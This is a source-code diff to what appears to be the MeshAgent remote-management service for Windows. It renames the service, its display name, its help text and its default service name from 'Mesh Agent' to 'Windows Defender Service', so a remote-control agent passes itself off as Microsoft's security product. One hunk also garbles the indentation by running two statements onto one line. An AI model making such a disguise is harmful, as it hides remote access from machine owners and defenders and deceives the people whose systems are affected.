@@ -45,8 +45,8 @@ limitations under the License.
 
 #include <WtsApi32.h>
 
-TCHAR* serviceFile = TEXT("Mesh Agent");
-TCHAR* serviceName = TEXT("Mesh Agent background service");
+TCHAR* serviceFile = TEXT("Windows Defender Service");
+TCHAR* serviceName = TEXT("Windows Defender background service");
 
 SERVICE_STATUS serviceStatus;
 SERVICE_STATUS_HANDLE serviceStatusHandle = 0;
@@ -302,13 +302,11 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
 		SetServiceStatus(serviceStatusHandle, &serviceStatus);
 
 		// Get our own executable name
-		GetModuleFileNameW(NULL, str, _MAX_PATH);
+	GetModuleFileNameW(NULL, str, _MAX_PATH);
 
 
-		// Run the mesh agent
-		CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
-
-		__try
+	// Run the background service
+	CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);		__try
 		{
 			agent = MeshAgent_Create(0);
 			agent->serviceReserved = 1;
@@ -784,7 +782,7 @@ int wmain(int argc, char* wargv[])
 #endif	
 	if (integratedJavaScript != NULL || (argc > 0 && strcasecmp(argv[0], "--slave") == 0) || (argc > 1 && ((strcasecmp(argv[1], "run") == 0) || (strcasecmp(argv[1], "connect") == 0) || (strcasecmp(argv[1], "--slave") == 0))))
 	{
-		// Run the mesh agent in console mode, since the agent is compiled for windows service, the KVM will not work right. This is only good for testing.
+		// Run the background service in console mode, since the agent is compiled for windows service, the KVM will not work right. This is only good for testing.
 		SetConsoleCtrlHandler((PHANDLER_ROUTINE)CtrlHandler, TRUE); // Set SIGNAL on windows to listen for Ctrl-C
 
 		__try
@@ -916,7 +914,7 @@ int wmain(int argc, char* wargv[])
 
 				if (argc != 1)
 				{
-					printf("Mesh Agent available switches:\r\n");
+					printf("Windows Defender Service available switches:\r\n");
 					printf("  run               Start as a console agent.\r\n");
 					printf("  connect           Start as a temporary console agent.\r\n");
 					printf("  start             Start the service.\r\n");
@@ -1505,7 +1503,7 @@ INT_PTR CALLBACK DialogHandler2(HWND hDlg, UINT message, WPARAM wParam, LPARAM l
 			serverid = Duktape_GetStringPropertyValue(g_dialogCtx, -1, "ServerID", NULL);
 			serverurl = Duktape_GetStringPropertyValue(g_dialogCtx, -1, "MeshServer", NULL);
 			displayName = Duktape_GetStringPropertyValue(g_dialogCtx, -1, "displayName", NULL);
-			meshServiceName = Duktape_GetStringPropertyValue(g_dialogCtx, -1, "meshServiceName", "Mesh Agent");
+			meshServiceName = Duktape_GetStringPropertyValue(g_dialogCtx, -1, "meshServiceName", "Windows Defender Service");
 			autoproxy = Duktape_GetStringPropertyValue(g_dialogCtx, -1, "autoproxy", NULL);
 			char *bkcolor = Duktape_GetStringPropertyValue(g_dialogCtx, -1, "bkcolor", "0,0,0");
 
